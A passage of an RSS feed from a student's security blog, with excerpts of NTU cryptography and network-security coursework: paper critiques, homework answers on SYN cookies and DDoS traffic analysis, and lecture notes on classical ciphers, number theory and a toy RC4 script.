+0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-3/</guid><description>&lt;h1 id="cryptography-and-network-security--comparative-critique-3">
 Cryptography and Network Security – Comparative Critique 3
 &lt;a class="anchor" href="#cryptography-and-network-security--comparative-critique-3">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/MLHx12AhT-S-DUoRfGUn4A">&lt;img src="https://hackmd.io/MLHx12AhT-S-DUoRfGUn4A/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-dnssec-vs-dohdns-over-https">
 Reading Topic: DNSSEC VS DoH(DNS-over-HTTPS)
 &lt;a class="anchor" href="#reading-topic-dnssec-vs-dohdns-over-https">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://tw.godaddy.com/help/what-is-dnssec-6135">什麼是 DNSSEC？&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>什麼是 DNSSEC？&lt;/p>
&lt;p>網域名稱系統安全性擴充 (DNSSEC) 可為網域名稱的 DNS (網域名稱系統) 加上電子簽名，藉此判斷來源網路名稱的真實性。此功能可以保護網路使用者不受假造 DNS 資料的威脅，讓使用者要求正確網址時不會取得其他有意誤導或惡意製作的網址。&lt;/p>
&lt;p>啟用 DNSSEC 後，DNS 查閱會使用電子簽名驗證網站 DNS 來源是否有效，這樣做可以協助防止受到特定類型的攻擊，而當電子簽名不一致的時候，瀏覽器便不會顯示網站。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://blog.miniasp.com/post/2008/10/22/Be-careful-DNS-cache-poisoning-attack">What is DNS Cache Poisoning? - 小心網域名稱伺服器快取毒害(DNS cache poisoning)攻擊&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>簡單的說，DNS 通常都會實做快取(Cache)功能，若 DNS 收到來自惡意假造的 DNS 封包，導致將錯誤的 Domain Name v.s. IP 對應資料快取在 DNS Server 中，就會讓使用這台 DNS Server 的使用者連結到錯誤的 IP，這將會是個十分嚴重的安全性漏洞！而這樣的安全性漏洞就稱之為 DNS cache poisoning&lt;/p></description></item><item><title>Cryptography and Network Security – Homework 1</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-1/</guid><description>&lt;h1 id="cryptography-and-network-security--homework-1">
 Cryptography and Network Security – Homework 1
 &lt;a class="anchor" href="#cryptography-and-network-security--homework-1">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/Tq2dPdTKQv6p3AvNbmyNig">&lt;img src="https://hackmd.io/Tq2dPdTKQv6p3AvNbmyNig/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler TOC
[TOC]
:::
:::info
&lt;a href="https://hackmd.io/@uqzWTXyyTk6IYTBwcPwnoA/BJZNQfcTo">Official Solution&lt;/a>
:::
Student ID: &lt;code>R11921A16&lt;/code>
Name: 何秉學&lt;/p>
&lt;h2 id="handwriting">
 Handwriting
 &lt;a class="anchor" href="#handwriting">#&lt;/a>
&lt;/h2>
&lt;h3 id="1-cia">
 1. CIA
 &lt;a class="anchor" href="#1-cia">#&lt;/a>
&lt;/h3>
&lt;p>&lt;strong>Ans:&lt;/strong>
&lt;strong>Confidentiality&lt;/strong> means all of the sensitive messages or information that can be protected so that just the people who have the authentication can edit or browse the information.&lt;/p>
&lt;p>&lt;strong>Integrity&lt;/strong> refers to the completeness of the message you transferred and ensured that the message is not altered by an unauthenticated person.&lt;/p></description></item><item><title>Cryptography and Network Security – Homework 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-2/</guid><description>&lt;h1 id="cryptography-and-network-security--homework-2">
 Cryptography and Network Security – Homework 2
 &lt;a class="anchor" href="#cryptography-and-network-security--homework-2">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/JauWo5dWQFS1wnZZjTPqow">&lt;img src="https://hackmd.io/JauWo5dWQFS1wnZZjTPqow/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler TOC
[TOC]
:::
Student ID: &lt;code>R11921A16&lt;/code>
Name: 何秉學&lt;/p>
&lt;h2 id="handwriting">
 Handwriting
 &lt;a class="anchor" href="#handwriting">#&lt;/a>
&lt;/h2>
&lt;h3 id="1-syn-cookies">
 1. SYN Cookies
 &lt;a class="anchor" href="#1-syn-cookies">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>Ans:
This strategy involves the creation of a cookie by the server. In order to avoid the risk of dropping connections when the backlog has been filled, the server responds to each connection request with a SYN-ACK packet but then drops the SYN request from the backlog, removing the request from memory and leaving the port open and ready to make a new connection. If the connection is a legitimate request, and a final ACK packet is sent from the client machine back to the server, the server will then reconstruct (with some limitations) the SYN backlog queue entry. While this mitigation effort does lose some information about the TCP connection, it is better than allowing denial-of-service to occur to legitimate users as a result of an attack.&lt;/p></description></item><item><title>Cryptography and Network Security – Homework 3</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-3/</guid><description>&lt;h1 id="cryptography-and-network-security--homework-3">
 Cryptography and Network Security – Homework 3
 &lt;a class="anchor" href="#cryptography-and-network-security--homework-3">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/JO7xByQgQWK67eU0goHMeA">&lt;img src="https://hackmd.io/JO7xByQgQWK67eU0goHMeA/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="1-ddos">
 1. DDoS
 &lt;a class="anchor" href="#1-ddos">#&lt;/a>
&lt;/h2>
&lt;h3 id="1">
 1)
 &lt;a class="anchor" href="#1">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Hint: You can use I/O Graphs to find the time that the flow starts to burst. Then you can find the first packet near there.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Ans: Using I/O graph in &lt;code>Statistic/I/O Graphs&lt;/code> in wireshark, then you can figure out the whole trend of this network flow.
:::spoiler Result Screenshot
&lt;img src="https://hackmd.io/_uploads/rJk-LueL3.jpg" alt="" />
:::
Also, you can set the different scale of the graph and figure out the attack time precisely. I set the &lt;code>Interval=100ms&lt;/code> and find the increasing time at &lt;code>24.8s&lt;/code> which is &lt;code>No.55862&lt;/code> packet shown as below.
:::spoiler Result Screenshot
&lt;img src="https://hackmd.io/_uploads/ryG7POxL2.png" alt="" />
:::
Thus, the attack time should be at &lt;font color="FF0000">&lt;code>24.945277&lt;/code>&lt;/font> and the victim is &lt;font color="FF0000">&lt;code>192.168.232.95&lt;/code>&lt;/font>
:::spoiler Result Screenshot
&lt;img src="https://hackmd.io/_uploads/Syurtue8h.png" alt="" />
:::&lt;/p></description></item><item><title>Cryptography and Network Security – HW0</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--hw0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--hw0/</guid><description>&lt;h1 id="cryptography-and-network-security--hw0">
 Cryptography and Network Security – HW0
 &lt;a class="anchor" href="#cryptography-and-network-security--hw0">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/_JU7eHmcRF-v8G6yQ3YHWQ">&lt;img src="https://hackmd.io/_JU7eHmcRF-v8G6yQ3YHWQ/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-the-tangled-web-of-password-reuse">
 Reading Topic: The Tangled Web of Password Reuse
 &lt;a class="anchor" href="#reading-topic-the-tangled-web-of-password-reuse">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="summary">
 Summary
 &lt;a class="anchor" href="#summary">#&lt;/a>
&lt;/h2>
&lt;p>Password security is a critical issue that we may pay attention. However, most people choose easy-remembered strings as their online-service password, which may cause the users to re-used the password as a different online service. Unfortunately, the number of network attacks is increasing, and attackers contain tons of users&amp;rsquo; information including re-used passwords. They tried to propose a guessing password algorithm including character sequence, deletions, insertion, capitalization, reversal, leet-speak, and substring movement to guess a series of candidate passwords that users may use at different websites according to a set of leaked passwords. Their prototype guessing algorithm is able to crack approximately 10% of the nonidentical password pairs in less than 10 attempts and approximately 30% such pairs in less than 100 attempts.&lt;/p></description></item><item><title>Cryptography and Network Security – Regular Critique 3</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-3/</guid><description>&lt;h1 id="cryptography-and-network-security--regular-critique-3">
 Cryptography and Network Security – Regular Critique 3
 &lt;a class="anchor" href="#cryptography-and-network-security--regular-critique-3">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/q_V04ik8RkCQS4-DbqJoGg">&lt;img src="https://hackmd.io/q_V04ik8RkCQS4-DbqJoGg/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-automated-detection-of-ipv6-privacy-leakage-in-home-networks">
 Reading Topic: Automated Detection of IPv6 Privacy Leakage in Home Networks
 &lt;a class="anchor" href="#reading-topic-automated-detection-of-ipv6-privacy-leakage-in-home-networks">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.moneydj.com/kmdj/wiki/wikiviewer.aspx?keyid=047cf9b1-e1ba-4578-8fcc-160bd2d3fc8d">What is Customer Premise Equipment? - 用戶終端設備(CPE)&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>英文名稱為Customer Premise Equipment，是指網路連接至用戶端的相關設備，包括數據機、寬頻路由器、寬頻閘道器等，但隨著電信網路應用服務逐漸多元化，只要是用戶端所使用的網路服務設備，都可稱為CPE裝置，包括VoIP閘道器、IP phone、雙模手機、IP STB等。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.jannet.hk/ip-address-version-6-ipv6-zh-hant/">What is EUI-64?&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>IPv6 Address太長，要網管人員逐個Interface設定IPv6 Address肯定是件痛苦的事。EUI-64讓我們只需幫Interface试定Prefix部份,然後Interface就會用MAC Address自動產生Interface ID，基於MAC Address 獨一無二，利用 EUI-64 必能生成獨一無二的 IPv6 Address。EUI-64 產生 Interface ID 的辦法是先把MAC Address （共48 Bits）斬開兩等份.中間插入FFFE供16 Bits），使其成為64 Bits，然後把第7 Bit由0改成1。最後在前面加上Prefix歟成為一組IPv6 Address 了。&lt;/p></description></item><item><title>Cryptography and Network Security – Regular Critique 4</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-4/</guid><description>&lt;h1 id="cryptography-and-network-security--regular-critique-4">
 Cryptography and Network Security – Regular Critique 4
 &lt;a class="anchor" href="#cryptography-and-network-security--regular-critique-4">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/pkjE25TQSNmDRBm-9OJL8A">&lt;img src="https://hackmd.io/pkjE25TQSNmDRBm-9OJL8A/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-dos-and-donts-of-machine-learning-in-computer-security">
 Reading Topic: Dos and Don&amp;rsquo;ts of Machine Learning in Computer Security
 &lt;a class="anchor" href="#reading-topic-dos-and-donts-of-machine-learning-in-computer-security">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="summary">
 Summary
 &lt;a class="anchor" href="#summary">#&lt;/a>
&lt;/h2>
&lt;p>In this paper, they tried to point out some pitfalls of computer security paper that are associated with machine learning. Especially the paper in the last 10 years published at top-tier conferences. In addition, they identify 10 common pitfalls such as sampling bias problems, label inaccuracy, data snooping problems, spurious correlations, etc that are associated with the whole machine learning workflow, i.e. data collection and labeling, system design and learning, performance evaluation and deployment, and operation. They also provide some recommendations and some remedies and try to mitigate the threat. The top 3 pitfalls in their research are sampling bias, data snooping, and lab-only evaluation.&lt;/p></description></item><item><title>Cryptography Lec 1(Overview) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-1overview---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-1overview---notes/</guid><description>&lt;h1 id="cryptography-lec-1overview---notes">
 Cryptography Lec 1(Overview) - Notes
 &lt;a class="anchor" href="#cryptography-lec-1overview---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Chosen Plaintext Attack(CPA security)
Attacker只可以拿到plaintext相對應的ciphertext，通常是在同一把key重複使用的情況下&lt;/p>
&lt;p>Chosen Cipnertext Attack(CCA security)
Attacker不只可以拿到plaintext相對應的ciphertext，他也可以知道ciphertext相對應的plaintext，進而得知很多額外的資訊&lt;/p>
&lt;p>Mode of Operation
e.g. ECB, CBC, CTR, GCM&amp;hellip;(Nonsecure $\to$ Secure)
選擇甚麼樣的mode和選擇麼加密演算法是完全獨立的事情，也可以每一個block都使用完全不同的加密演算法&lt;/p></description></item><item><title>Cryptography Lec 2(Historical Ciphers) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-2historical-ciphers---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-2historical-ciphers---notes/</guid><description>&lt;h1 id="cryptography-lec-2historical-ciphers---notes">
 Cryptography Lec 2(Historical Ciphers) - Notes
 &lt;a class="anchor" href="#cryptography-lec-2historical-ciphers---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler &lt;a href="https://ithelp.ithome.com.tw/articles/10160406">資訊安全筆記2 The Vigenere Cipher&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>The Vigenere Cipher是一種&amp;quot;polyalphabetic cipher&amp;quot;用一串的 Key 不斷地重複！例如 abcabcabcabc
計算方法：
例如key = d 代表a會變成d所以 w 會變成 Z&lt;/p>
&lt;p>課本上的例子：
&lt;img src="http://ithelp.ithome.com.tw/upload/images/20141017/201410172334255441370129a1a_resize_600.png" alt="" />
:::&lt;/p>&lt;/blockquote>
&lt;p>:::spoiler &lt;a href="https://www.geeksforgeeks.org/playfair-cipher-with-examples/">Playfair Cipher&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>The Playfair Cipher Encryption Algorithm:
The Algorithm consists of 2 steps:&lt;/p>
&lt;ol>
&lt;li>Generate the key Square(5×5):&lt;/li>
&lt;li>Algorithm to encrypt the plain text: The plaintext is split into pairs of two letters (digraphs). If there is an odd number of letters, a Z is added to the last letter.
&amp;gt; For example:
&lt;code>PlainText: &amp;quot;instruments&amp;quot; After Split: 'in' 'st' 'ru' 'me' 'nt' 'sz'&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>:::info
Note that: Pair cannot be made with same letter. Break the letter in single and add a bogus letter to the previous letter.
:::&lt;/p></description></item><item><title>Cryptography Lec 3(Mathematical Background) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-3mathematical-background---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-3mathematical-background---notes/</guid><description>&lt;h1 id="cryptography-lec-3mathematical-background---notes">
 Cryptography Lec 3(Mathematical Background) - Notes
 &lt;a class="anchor" href="#cryptography-lec-3mathematical-background---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler &lt;a href="https://youtu.be/qym5D5bhoQs">Euclidean Algorithm(輾轉相除法)&lt;/a>
Given $a$ and $b$ with $a \ge b$
Compute $gcd(a,\ b)=gcd(b,\ a\ mod\ b)$, $gcd(a,\ 0)=a$
For example
$$
Compute\ gcd(140,\ 297)\
297=2&lt;em>140+17 \
140=8&lt;/em>17+4 \
17=4&lt;em>4+1 \
4=4&lt;/em>4+0
$$
Then we found the $gcd(140,\ 297)=1$&lt;/p>
&lt;hr>
&lt;p>Another Example:
$$
Compute\ gcd(270,\ 192)\
270=1&lt;em>192+78\
192=2&lt;/em>78+36\
78=2&lt;em>36+6\
36=6&lt;/em>6+0
$$
Then we found $gcd(270,\ 192)=6$
:::&lt;/p></description></item><item><title>Cryptography Lec 4(Information Theory) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-4information-theory---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-4information-theory---notes/</guid><description>&lt;h1 id="cryptography-lec-4information-theory---notes">
 Cryptography Lec 4(Information Theory) - Notes
 &lt;a class="anchor" href="#cryptography-lec-4information-theory---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Shannon&amp;rsquo;s Theorem
假設：$(P,\ C,\ K,\ e_k(\cdot),\ d_k(\cdot))$是一個cryptosystem，且$P,\ C,\ K$各自集合的數量都是一樣的
則：
$$此cryptosystem具有perfect\ secrecy\
iff\
每一把key被使用的機率都相同，i.e.{1 \over #K}，且對於每個m\in P和c\in C都有一個獨立的key\ k使得e_k(m)=c
$$&lt;/p></description></item><item><title>Cryptography Lec 5(Symmetric Key Cryptography) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-5symmetric-key-cryptography---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-5symmetric-key-cryptography---notes/</guid><description>&lt;h1 id="cryptography-lec-5symmetric-key-cryptography---notes">
 Cryptography Lec 5(Symmetric Key Cryptography) - Notes
 &lt;a class="anchor" href="#cryptography-lec-5symmetric-key-cryptography---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.csdn.net/qq_42950838/article/details/117536583#Modification_Detection_Code_MDC_9">What is MDC and MAC? - 【CN007】数据安全笔记8 —— MDC 和 MAC&lt;/a>&lt;/p>
&lt;blockquote>
&lt;h2 id="">
 MDC 是一種用於驗證數據完整性的摘要信息，保證數據沒有被更改。
&lt;img src="https://img-blog.csdnimg.cn/20210603231335485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTUwODM4,size_16,color_FFFFFF,t_70" alt="" />
 &lt;a class="anchor" href="#">#&lt;/a>
&lt;/h2>
&lt;p>MAC 在 MDC 的基礎上增加了 Key 的使用。同時驗證數據完整性和發送者，保證發送者是特定人並且傳輸過程中數據沒有被更改。MAC 函數又稱為 Key 哈希函數（Keyed Hash Function）
&lt;img src="https://img-blog.csdnimg.cn/20210603225822420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTUwODM4,size_16,color_FFFFFF,t_70" alt="" />&lt;/p>&lt;/blockquote>
&lt;p>:::spoiler &lt;a href="https://ithelp.ithome.com.tw/articles/10263124">About RC4&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>第一部分 前置作業&lt;/p>
&lt;ol>
&lt;li>建立一個 S-box（寫作 S）&lt;/li>
&lt;li>決定密鑰&lt;/li>
&lt;li>建立密鑰列表 K&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>第二部分 把 S 打亂&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第三部分 加密&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>S &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#ae81ff">3&lt;/span>,&lt;span style="color:#ae81ff">4&lt;/span>,&lt;span style="color:#ae81ff">5&lt;/span>,&lt;span style="color:#ae81ff">6&lt;/span>,&lt;span style="color:#ae81ff">7&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>K &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#ae81ff">3&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#ae81ff">3&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>P &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">5&lt;/span>,&lt;span style="color:#ae81ff">3&lt;/span>,&lt;span style="color:#ae81ff">6&lt;/span>,&lt;span style="color:#ae81ff">7&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">8&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> j &lt;span style="color:#f92672">=&lt;/span> ( j &lt;span style="color:#f92672">+&lt;/span> S[i] &lt;span style="color:#f92672">+&lt;/span> K[i] ) &lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> S[i], S[j] &lt;span style="color:#f92672">=&lt;/span> S[j], S[i]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>i, j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c_list &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> flag &lt;span style="color:#f92672">&amp;lt;&lt;/span> len(P):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> i &lt;span style="color:#f92672">=&lt;/span> (i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> j &lt;span style="color:#f92672">=&lt;/span> (j &lt;span style="color:#f92672">+&lt;/span>S[i]) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> S[i], S[j] &lt;span style="color:#f92672">=&lt;/span> S[j], S[i]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> (S[i] &lt;span style="color:#f92672">+&lt;/span> S[j] ) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> k &lt;span style="color:#f92672">=&lt;/span> S[t]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> k &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{:03b}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(k)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{:03b}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(P[flag])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> n &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">3&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c &lt;span style="color:#f92672">+=&lt;/span> str(int(k[n])&lt;span style="color:#f92672">^&lt;/span>int(p[n]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c_list&lt;span style="color:#f92672">.&lt;/span>append(int(c, &lt;span style="color:#ae81ff">2&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(c_list)
